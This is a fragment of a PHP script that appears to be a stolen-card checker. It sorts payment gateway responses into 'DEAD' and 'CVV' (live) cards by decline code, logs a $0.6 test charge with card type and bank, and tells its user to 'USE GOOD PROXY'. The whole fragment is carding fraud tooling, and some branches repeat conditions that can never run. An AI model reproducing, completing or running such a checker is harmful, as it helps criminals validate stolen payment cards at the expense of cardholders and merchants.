    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[incorrect_number]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'card was declined.')) {
     echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  "do_not_honor")) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  "do_not_honor")) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[do_not_honor]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result3,  'Your card does not support this type of purchase.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[Your card does not support this type of purchase.]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  
  elseif
  (strpos($result3,  "transaction_not_allowed")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[transaction_not_allowed]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result3,  'card was declined.')) {
    echo  "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  "generic_decline")) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[generic_decline]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  
  elseif 
  (strpos($result3,  'are not able to process your payment request at the moment. Please try again later.')) {
    echo  "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-danger'> MSG->[USE GOOD PROXY ]</span> -> <span class='text-danger'></span> -> <span class='text-dark'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  else {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.{due to unknoen earror}]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
curl_close($ch);
ob_flush();

//echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result3<br><br>";
//echo $token;

?>